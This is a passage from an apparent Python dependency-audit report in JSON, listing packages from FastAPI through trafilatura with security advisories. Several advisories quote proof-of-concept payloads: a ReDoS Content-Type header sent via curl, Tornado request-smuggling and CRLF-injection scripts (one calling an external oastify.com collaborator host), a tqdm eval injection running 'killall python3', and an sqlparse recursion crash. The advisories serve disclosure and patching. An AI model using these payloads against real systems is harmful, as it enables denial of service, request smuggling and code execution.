@nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"}, {"id": "GHSA-59g5-xgcq-4qw3", "fix_versions": ["0.0.18"], "aliases": ["CVE-2024-53981"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}]}, {"name": "python-slugify", "version": "5.0.2", "vulns": []}, {"name": "python-snappy", "version": "0.6.1", "vulns": []}, {"name": "python-socketio", "version": "5.13.0", "vulns": []}, {"name": "python-xlib", "version": "0.33", "vulns": []}, {"name": "pytoolconfig", "version": "1.2.5", "vulns": []}, {"name": "pytr", "version": "0.4.2", "vulns": []}, {"name": "pytweening", "version": "1.2.0", "vulns": []}, {"name": "pytz", "version": "2022.7", "vulns": []}, {"name": "pyviz-comms", "version": "2.3.0", "vulns": []}, {"name": "pywavelets", "version": "1.4.1", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "pyyaml-env-tag", "version": "0.1", "vulns": []}, {"name": "pyzmq", "version": "27.0.0", "vulns": []}, {"name": "qdarkstyle", "version": "3.0.2", "vulns": []}, {"name": "qdrant-client", "version": "1.4.0", "vulns": [{"id": "GHSA-7m75-x27w-r52r", "fix_versions": ["1.9.0"], "aliases": ["CVE-2024-3829"], "description": "qdrant/qdrant version 1.9.0-dev is vulnerable to arbitrary file read and write during the snapshot recovery process. Attackers can exploit this vulnerability by manipulating snapshot files to include symlinks, leading to arbitrary file read by adding a symlink that points to a desired file on the filesystem and arbitrary file write by including a symlink and a payload file in the snapshot's directory structure. This vulnerability allows for the reading and writing of arbitrary files on the server, which could potentially lead to a full takeover of the system. The issue is fixed in version v1.9.0."}]}, {"name": "qstylizer", "version": "0.2.2", "vulns": []}, {"name": "qtawesome", "version": "1.2.2", "vulns": []}, {"name": "qtconsole", "version": "5.4.2", "vulns": []}, {"name": "qtpy", "version": "2.2.0", "vulns": []}, {"name": "questionary", "version": "2.0.0", "vulns": []}, {"name": "queuelib", "version": "1.5.0", "vulns": []}, {"name": "ratelimiter", "version": "1.2.0.post0", "vulns": []}, {"name": "readability-lxml", "version": "0.8.1", "vulns": []}, {"name": "redis", "version": "5.0.0", "vulns": []}, {"name": "referencing", "version": "0.35.1", "vulns": []}, {"name": "regex", "version": "2023.8.8", "vulns": []}, {"name": "requests", "version": "2.31.0", "vulns": [{"id": "GHSA-9wx4-h78v-vm56", "fix_versions": ["2.32.0"], "aliases": ["CVE-2024-35195"], "description": "When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.  ### Remediation Any of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.  * Upgrade to `requests>=2.32.0`. * For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session. * For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.  ### Related Links * https://github.com/psf/requests/pull/6655"}, {"id": "GHSA-9hjg-9r4m-mvj7", "fix_versions": ["2.32.4"], "aliases": ["CVE-2024-47081"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "requests-file", "version": "1.5.1", "vulns": []}, {"name": "requests-futures", "version": "1.0.2", "vulns": []}, {"name": "requests-oauthlib", "version": "1.3.1", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "responses", "version": "0.25.7", "vulns": []}, {"name": "retry", "version": "0.9.2", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rfc3986-validator", "version": "0.1.1", "vulns": []}, {"name": "rich", "version": "13.5.3", "vulns": []}, {"name": "rope", "version": "1.7.0", "vulns": []}, {"name": "rpds-py", "version": "0.22.3", "vulns": []}, {"name": "rsa", "version": "4.9", "vulns": []}, {"name": "rtree", "version": "1.0.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.14", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.12", "vulns": []}, {"name": "ruamel-yaml-conda", "skip_reason": "Dependency not found on PyPI and could not be audited: ruamel-yaml-conda (0.17.21)"}, {"name": "rubicon-objc", "version": "0.4.9", "vulns": []}, {"name": "rust", "version": "1.3.1", "vulns": []}, {"name": "s3fs", "version": "2023.4.0", "vulns": []}, {"name": "safetensors", "version": "0.5.3", "vulns": []}, {"name": "safety", "version": "3.5.2", "vulns": []}, {"name": "safety-schemas", "version": "0.0.14", "vulns": []}, {"name": "schedule", "version": "1.2.2", "vulns": []}, {"name": "scikit-image", "version": "0.20.0", "vulns": []}, {"name": "scikit-learn", "version": "1.3.0", "vulns": [{"id": "PYSEC-2024-110", "fix_versions": ["1.5.0"], "aliases": ["CVE-2024-5206"], "description": "A sensitive data leakage vulnerability was identified in scikit-learn's TfidfVectorizer, specifically in versions up to and including 1.4.1.post1, which was fixed in version 1.5.0. The vulnerability arises from the unexpected storage of all tokens present in the training data within the `stop_words_` attribute, rather than only storing the subset of tokens required for the TF-IDF technique to function. This behavior leads to the potential leakage of sensitive information, as the `stop_words_` attribute could contain tokens that were meant to be discarded and not stored, such as passwords or keys. The impact of this vulnerability varies based on the nature of the data being processed by the vectorizer."}]}, {"name": "scipy", "version": "1.11.1", "vulns": []}, {"name": "scrapy", "version": "2.8.0", "vulns": [{"id": "PYSEC-2017-83", "fix_versions": [], "aliases": ["GHSA-h7wm-ph43-c39p", "CVE-2017-14158"], "description": "Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore."}, {"id": "PYSEC-2024-162", "fix_versions": ["2.11.1"], "aliases": ["CVE-2024-1892"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability exists in the XMLFeedSpider class of the scrapy/scrapy project, specifically in the parsing of XML content. By crafting malicious XML content that exploits inefficient regular expression complexity used in the parsing process, an attacker can cause a denial-of-service (DoS) condition. This vulnerability allows for the system to hang and consume significant resources, potentially rendering services that utilize Scrapy for XML processing unresponsive."}, {"id": "GHSA-cw9j-q3vf-hrrv", "fix_versions": ["1.8.4", "2.11.1"], "aliases": ["CVE-2024-3574"], "description": "### Impact  When you send a request with the `Authorization` header to one domain, and the response asks to redirect to a different domain, Scrapy\u2019s built-in redirect middleware creates a follow-up redirect request that keeps the original `Authorization` header, leaking its content to that second domain.  The [right behavior](https://fetch.spec.whatwg.org/#ref-for-cors-non-wildcard-request-header-name) would be to drop the `Authorization` header instead, in this scenario.  ### Patches  Upgrade to Scrapy 2.11.1.  If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.  ### Workarounds  If you cannot upgrade, make sure that you are not using the `Authentication` header, either directly or through some third-party plugin.  If you need to use that header in some requests, add `\"dont_redirect\": True` to the `request.meta` dictionary of those requests to disable following redirects for them.  If you need to keep (same domain) redirect support on those requests, make sure you trust the target website not to redirect your requests to a different domain.  ### Acknowledgements  This security issue was reported by @ranjit-git  [through huntr.com](https://huntr.com/bounties/49974321-2718-43e3-a152-62b16eed72a9/)."}, {"id": "GHSA-7j7m-v7m3-jqm7", "fix_versions": ["1.8.4", "2.11.1"], "aliases": ["CVE-2024-3572"], "description": "### Impact  Scrapy limits allowed response sizes by default through the [`DOWNLOAD_MAXSIZE`](https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize) and [`DOWNLOAD_WARNSIZE`](https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize) settings.  However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to [decompression bombs](https://cwe.mitre.org/data/definitions/409.html).  A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.  ### Patches  Upgrade to Scrapy 2.11.1.  If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.  ### Workarounds  There is no easy workaround.  Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.  However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.  ### Acknowledgements  This security issue was reported by @dmandefy  [through huntr.com](https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/)."}, {"id": "GHSA-23j4-mw76-5v7h", "fix_versions": ["2.11.2"], "aliases": [], "description": "### Impact  Scrapy was following redirects regardless of the URL protocol, so redirects were working for `data://`, `file://`, `ftp://`, `s3://`, and any other scheme defined in the `DOWNLOAD_HANDLERS` setting.  However, HTTP redirects should only work between URLs that use the `http://` or `https://` schemes.  A malicious actor, given write access to the start requests (e.g. ability to define `start_urls`) of a spider and read access to the spider output, could exploit this vulnerability to: - Redirect to any local file using the `file://` scheme to read its contents. - Redirect to an `ftp://` URL of a malicious FTP server to obtain the FTP username and password configured in the spider or project. - Redirect to any `s3://` URL to read its content using the S3 credentials configured in the spider or project.  For `file://` and `s3://`, how the spider implements its parsing of input data into an output item determines what data would be vulnerable. A spider that always outputs the entire contents of a response would be completely vulnerable, while a spider that extracted only fragments from the response could significantly limit vulnerable data.  ### Patches  Upgrade to Scrapy 2.11.2.  ### Workarounds  Replace the built-in retry middlewares (`RedirectMiddleware` and `MetaRefreshMiddleware`) with custom ones that implement the fix from Scrapy 2.11.2, and verify that they work as intended.  ### References  This security issue was reported by @mvsantos at https://github.com/scrapy/scrapy/issues/457. "}, {"id": "GHSA-4qqq-9vqf-3h3f", "fix_versions": ["2.11.2"], "aliases": ["CVE-2024-1968"], "description": "### Impact  Since version 2.11.1, Scrapy drops the `Authorization` header when a request is redirected to a different domain. However, it keeps the header if the domain remains the same but the scheme (http/https) or the port change, all scenarios where the header should also be dropped.  In the context of a man-in-the-middle attack, this could be used to get access to the value of that `Authorization` header  ### Patches  Upgrade to Scrapy 2.11.2.  ### Workarounds  There is no easy workaround for unpatched versions of Scrapy. You can replace the built-in redirect middlewares with custom ones patched for this issue, but you have to patch them yourself, manually.  ### References  This security issue was reported and fixed by @szarny at https://huntr.com/bounties/27f6a021-a891-446a-ada5-0226d619dd1a/. "}, {"id": "GHSA-jm3v-qxmh-hxwv", "fix_versions": ["2.11.2"], "aliases": [], "description": "### Impact  When using system proxy settings, which are scheme-specific (i.e. specific to `http://` or `https://` URLs), Scrapy was not accounting for scheme changes during redirects.  For example, an HTTP request would use the proxy configured for HTTP and, when redirected to an HTTPS URL, the new HTTPS request would still use the proxy configured for HTTP instead of switching to the proxy configured for HTTPS. Same the other way around.  If you have different proxy configurations for HTTP and HTTPS in your system for security reasons (e.g., maybe you don\u2019t want one of your proxy providers to be aware of the URLs that you visit with the other one), this would be a security issue.  ### Patches  Upgrade to Scrapy 2.11.2.  ### Workarounds  Replace the built-in retry middlewares (`RedirectMiddleware` and `MetaRefreshMiddleware`) and the `HttpProxyMiddleware` middleware with custom ones that implement the fix from Scrapy 2.11.2, and verify that they work as intended.  ### References  This security issue was reported by @redapple at https://github.com/scrapy/scrapy/issues/767. "}]}, {"name": "seaborn", "version": "0.12.2", "vulns": []}, {"name": "selenium", "version": "4.27.1", "vulns": []}, {"name": "semgrep", "version": "1.128.0", "vulns": []}, {"name": "semver", "version": "3.0.1", "vulns": []}, {"name": "send2trash", "version": "1.8.0", "vulns": []}, {"name": "sentence-transformers", "version": "5.0.0", "vulns": []}, {"name": "sentencepiece", "version": "0.2.0", "vulns": []}, {"name": "service-identity", "version": "18.1.0", "vulns": []}, {"name": "setproctitle", "version": "1.2.2", "vulns": []}, {"name": "setuptools", "version": "65.6.3", "vulns": [{"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["GHSA-5rjg-fvgr-3xxf", "CVE-2025-47273"], "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."}]}, {"name": "shapely", "version": "2.1.1", "vulns": []}, {"name": "shellingham", "version": "1.5.3", "vulns": []}, {"name": "shtab", "version": "1.7.2", "vulns": []}, {"name": "simple-websocket", "version": "1.1.0", "vulns": []}, {"name": "sip", "version": "6.6.2", "vulns": []}, {"name": "six", "version": "1.16.0", "vulns": []}, {"name": "smart-open", "version": "5.2.1", "vulns": []}, {"name": "smmap", "version": "3.0.5", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "snowballstemmer", "version": "2.2.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.4", "vulns": []}, {"name": "spacy", "version": "3.5.4", "vulns": []}, {"name": "spacy-legacy", "version": "3.0.12", "vulns": []}, {"name": "spacy-loggers", "version": "1.0.4", "vulns": []}, {"name": "sphinx", "version": "8.1.3", "vulns": []}, {"name": "sphinx-rtd-theme", "version": "3.0.2", "vulns": []}, {"name": "sphinxcontrib-applehelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-devhelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-htmlhelp", "version": "2.1.0", "vulns": []}, {"name": "sphinxcontrib-jquery", "version": "4.1", "vulns": []}, {"name": "sphinxcontrib-jsmath", "version": "1.0.1", "vulns": []}, {"name": "sphinxcontrib-qthelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-serializinghtml", "version": "2.0.0", "vulns": []}, {"name": "spyder", "version": "5.4.3", "vulns": []}, {"name": "spyder-kernels", "version": "2.4.4", "vulns": []}, {"name": "sqlalchemy", "version": "1.4.39", "vulns": []}, {"name": "sqlparse", "version": "0.4.4", "vulns": [{"id": "GHSA-2m57-hf25-phgg", "fix_versions": ["0.5.0"], "aliases": ["CVE-2024-4340"], "description": "### Summary Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.  ### Details + PoC Running the following code will raise Maximum recursion limit exceeded exception: ```py import sqlparse sqlparse.parse('[' * 10000 + ']' * 10000) ``` We expect a traceback of RecursionError: ```py Traceback (most recent call last):   File \"trigger_sqlparse_nested_list.py\", line 3, in <module>     sqlparse.parse('[' * 10000 + ']' * 10000)   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/__init__.py\", line 30, in parse     return tuple(parsestream(sql, encoding))   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/filter_stack.py\", line 36, in run     stmt = grouping.group(stmt)   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py\", line 428, in group     func(stmt)   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py\", line 53, in group_brackets     _group_matching(tlist, sql.SquareBrackets)   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py\", line 48, in _group_matching     tlist.group_tokens(cls, open_idx, close_idx)   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 328, in group_tokens     grp = grp_cls(subtokens)   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 161, in __init__     super().__init__(None, str(self))   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 165, in __str__     return ''.join(token.value for token in self.flatten())   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 165, in <genexpr>     return ''.join(token.value for token in self.flatten())   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 214, in flatten     yield from token.flatten()   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 214, in flatten     yield from token.flatten()   File \"/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py\", line 214, in flatten     yield from token.flatten()   [Previous line repeated 983 more times] RecursionError: maximum recursion depth exceeded ```  ### Fix suggestion The [flatten()](https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/sql.py#L207) function of TokenList class should limit the recursion to a maximal depth: ```py from sqlparse.exceptions import SQLParseError  MAX_DEPTH = 100      def flatten(self, depth=1):         \"\"\"Generator yielding ungrouped tokens.          This method is recursively called for all child tokens.         \"\"\"     if depth >= MAX_DEPTH:         raise SQLParseError('Maximal depth reached')         for token in self.tokens:             if token.is_group:                 yield from token.flatten(depth + 1)             else:                 yield token ```  ### Impact Denial of Service (the impact depends on the use). Anyone parsing a user input with sqlparse.parse() is affected. "}]}, {"name": "srsly", "version": "2.4.7", "vulns": []}, {"name": "stack-data", "version": "0.2.0", "vulns": []}, {"name": "starlette", "version": "0.41.3", "vulns": []}, {"name": "statsmodels", "version": "0.14.0", "vulns": []}, {"name": "stevedore", "version": "5.4.1", "vulns": []}, {"name": "streamlit", "version": "1.46.1", "vulns": []}, {"name": "stringcase", "version": "1.2.0", "vulns": []}, {"name": "svgwrite", "version": "1.4.3", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "tables", "version": "3.8.0", "vulns": []}, {"name": "tabulate", "version": "0.8.10", "vulns": []}, {"name": "tbb", "skip_reason": "Dependency not found on PyPI and could not be audited: tbb (0.2)"}, {"name": "tblib", "version": "1.7.0", "vulns": []}, {"name": "tenacity", "version": "8.2.2", "vulns": []}, {"name": "tensorboard", "version": "2.13.0", "vulns": []}, {"name": "tensorboard-data-server", "version": "0.7.1", "vulns": []}, {"name": "tensorflow", "version": "2.13.0", "vulns": []}, {"name": "tensorflow-estimator", "version": "2.13.0", "vulns": []}, {"name": "tensorflow-macos", "version": "2.13.0", "vulns": []}, {"name": "termcolor", "version": "2.3.0", "vulns": []}, {"name": "terminado", "version": "0.17.1", "vulns": []}, {"name": "text-unidecode", "version": "1.3", "vulns": []}, {"name": "textdistance", "version": "4.2.1", "vulns": []}, {"name": "thinc", "version": "8.1.12", "vulns": []}, {"name": "threadpoolctl", "version": "2.2.0", "vulns": []}, {"name": "three-merge", "version": "0.1.1", "vulns": []}, {"name": "tifffile", "version": "2021.7.2", "vulns": []}, {"name": "tiktoken", "version": "0.9.0", "vulns": []}, {"name": "timm", "version": "0.9.2", "vulns": []}, {"name": "tinycss2", "version": "1.2.1", "vulns": []}, {"name": "tld", "version": "0.13", "vulns": []}, {"name": "tldextract", "version": "3.2.0", "vulns": []}, {"name": "tokenizers", "version": "0.20.3", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.0.2", "vulns": []}, {"name": "tomlkit", "version": "0.11.1", "vulns": []}, {"name": "toolz", "version": "0.12.0", "vulns": []}, {"name": "torch", "version": "2.7.1", "vulns": [{"id": "GHSA-887c-mr87-cxwp", "fix_versions": [], "aliases": ["CVE-2025-3730"], "description": "A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue."}]}, {"name": "torchvision", "version": "0.22.1", "vulns": []}, {"name": "tornado", "version": "6.3.2", "vulns": [{"id": "GHSA-qppv-j76h-2rpx", "fix_versions": ["6.3.3"], "aliases": [], "description": "## Summary Tornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.  ## Details Tornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations: ### `tornado/http1connection.py:445` ```python3             self._expected_content_remaining = int(headers[\"Content-Length\"]) ``` ### `tornado/http1connection.py:621` ```python3                 content_length = int(headers[\"Content-Length\"])  # type: Optional[int] ``` ### `tornado/http1connection.py:671` ```python3             chunk_len = int(chunk_len_str.strip(), 16) ``` Because `int(\"0_0\") == int(\"+0\") == int(\"-0\") == int(\"0\")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy.   "}, {"id": "GHSA-753j-mpmx-qq6g", "fix_versions": ["6.4.1"], "aliases": [], "description": "### Summary When Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.  ### PoC 0. Install Tornado. 1. Start a simple Tornado server that echoes each received request's body: ```bash cat << EOF > server.py import asyncio import tornado  class MainHandler(tornado.web.RequestHandler):     def post(self):         self.write(self.request.body)  async def main():     tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)     await asyncio.Event().wait()  asyncio.run(main()) EOF python3 server.py & ``` 2. Send a valid chunked request: ```bash printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000 ``` 3. Observe that the response is as expected: ``` HTTP/1.1 200 OK Server: TornadoServer/6.3.3 Content-Type: text/html; charset=UTF-8 Date: Sat, 07 Oct 2023 17:32:05 GMT Content-Length: 1  Z ``` 4. Send a request with two `Transfer-Encoding: chunked` headers: ``` printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000 ``` 5. Observe the strange response: ``` HTTP/1.1 200 OK Server: TornadoServer/6.3.3 Content-Type: text/html; charset=UTF-8 Date: Sat, 07 Oct 2023 17:35:40 GMT Content-Length: 0  HTTP/1.1 400 Bad Request  ``` This is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.  ### Impact Anyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization. "}, {"id": "GHSA-w235-7p84-xx57", "fix_versions": ["6.4.1"], "aliases": [], "description": "### Summary Tornado\u2019s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.  ### Details When an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.  This behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.  This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl\u2019s documentation states:  > The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.  pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado\u2019s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.  ### PoC The issue can be reproduced using the following script:  ```python import asyncio  from tornado import httpclient from tornado import curl_httpclient  async def main():     http_client = curl_httpclient.CurlAsyncHTTPClient()      request = httpclient.HTTPRequest(         # Burp Collaborator payload         \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",         method=\"POST\",         body=\"body\",         # Injected header using CRLF characters         headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}     )      response = await http_client.fetch(request)     print(response.body)      http_client.close()  if __name__ == \"__main__\":     asyncio.run(main()) ```  When the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:  ```http POST / HTTP/1.1 Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com User-Agent: Mozilla/5.0 (compatible; pycurl) Accept: */* Accept-Encoding: gzip,deflate Foo: Bar Header: Injected Content-Length: 4 Content-Type: application/x-www-form-urlencoded  body ```  The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:  ```http POST /attacker-controlled-url HTTP/1.1 Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com Content-Length: 4 Content-Type: application/x-www-form-urlencoded  body ```  ### Impact Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities."}, {"id": "GHSA-7cx3-6m66-7c5m", "fix_versions": ["6.5"], "aliases": ["CVE-2025-47287"], "description": "### Summary  When Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.  ### Affected versions  All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.  ### Solution  Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy."}, {"id": "GHSA-8w49-h785-mj3c", "fix_versions": ["6.4.2"], "aliases": ["CVE-2024-52804"], "description": "The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests.  See also CVE-2024-7592 for a similar vulnerability in cpython."}]}, {"name": "tqdm", "version": "4.66.1", "vulns": [{"id": "GHSA-g7vv-2v7x-gj9p", "fix_versions": ["4.66.3"], "aliases": ["CVE-2024-34062"], "description": "### Impact Any optional non-boolean CLI arguments (e.g. `--delim`, `--buf-size`, `--manpath`) are passed through python's `eval`, allowing arbitrary code execution. Example:  ```sh python -m tqdm --manpath=\"\\\" + str(exec(\\\"import os\\nos.system('echo hi && killall python3')\\\")) + \\\"\" ```  ### Patches https://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316 released in `tqdm>=4.66.3`  ### Workarounds None  ### References - https://github.com/tqdm/tqdm/releases/tag/v4.66.3"}]}, {"name": "trafilatura", "version": "1.6.2", "vulns": []}, 